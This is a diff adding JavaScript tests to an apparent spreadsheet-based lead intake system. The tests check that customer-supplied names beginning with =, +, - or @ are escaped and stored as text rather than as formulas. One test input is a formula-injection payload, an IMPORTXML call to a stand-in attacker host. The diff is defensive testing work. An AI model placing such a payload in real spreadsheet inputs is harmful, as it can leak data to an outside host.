@@ -204,6 +204,40 @@ describe("the signature and the envelope", () => {
   });
 });
 
+describe("text from outside never becomes a formula", () => {
+  it("a name that starts with = + - @ is stored as text, in the sheet and in the journal", () => {
+    const evil = '=IMPORTXML("https://evil.example/x";"//a")';
+    const r = send(
+      request(
+        "lead.created",
+        leadData("L-2026-0140", {
+          customer: { ref: "0198a999-0000-7000-8000-000000000001", display_name: evil, telegram_username: "@ok" },
+        }),
+      ),
+    );
+    expect(r.answer.result).toBe("applied");
+    const lead = read("leads").find((l) => l.num === "L-2026-0140");
+    expect(lead.name).toBe(evil);
+    const sh = p.env.ss.getSheetByName("Заявки");
+    const cell = sh._cell(
+      lead._row,
+      2 + JSON.parse(p.run("JSON.stringify(NV_SCHEMA.leads.cols.map((c) => c.key))")).indexOf("name"),
+    );
+    expect(cell.f).toBeUndefined();
+    expect(read("clients").find((c) => c.ref === "0198a999-0000-7000-8000-000000000001").name).toBe(evil);
+  });
+
+  it("nvSafeText only touches strings that could be read as a formula or a number sign", () => {
+    expect(p.call("nvSafeText", "=1+1")).toBe("'=1+1");
+    expect(p.call("nvSafeText", "+998901234567")).toBe("'+998901234567");
+    expect(p.call("nvSafeText", "-5")).toBe("'-5");
+    expect(p.call("nvSafeText", "@nick")).toBe("'@nick");
+    expect(p.call("nvSafeText", "Обычный текст")).toBe("Обычный текст");
+    expect(p.call("nvSafeText", 12)).toBe(12);
+    expect(p.call("nvSafeText", "")).toBe("");
+  });
+});
+
 describe("idempotency and the lock", () => {
   it("a repeated id answers «duplicate», changes nothing and is written as «Повтор»", () => {
     const req = request("lead.created", leadData("L-2026-0120"));
